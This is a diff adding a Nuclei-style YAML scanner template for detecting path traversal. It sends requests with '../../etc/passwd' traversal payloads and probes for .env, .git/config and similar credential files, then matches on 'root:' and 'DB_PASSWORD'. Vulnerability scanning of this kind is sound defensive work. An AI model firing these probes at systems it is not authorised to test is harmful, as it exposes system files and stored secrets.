@@ -1,0 +1,35 @@
+id: path-traversal-generic
+info:
+  name: Generic Path Traversal Detection
+  author: pdteam
+  severity: high
+  description: Path traversal vulnerability allows attackers to access files outside the web root directory
+  tags:
+    - lfi
+    - traversal
+    - high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/../../etc/passwd"
+      - "{{BaseURL}}/../../../etc/passwd"
+      - "{{BaseURL}}/../../../../etc/passwd"
+      - "{{BaseURL}}/file.php?path=../../etc/passwd"
+      - "{{BaseURL}}/download?file=../../../etc/passwd"
+      - "{{BaseURL}}/.env"
+      - "{{BaseURL}}/.git/config"
+      - "{{BaseURL}}/config.php"
+      - "{{BaseURL}}/web.config"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "root:"
+          - "daemon:"
+          - "DB_PASSWORD"
+          - "[core]"
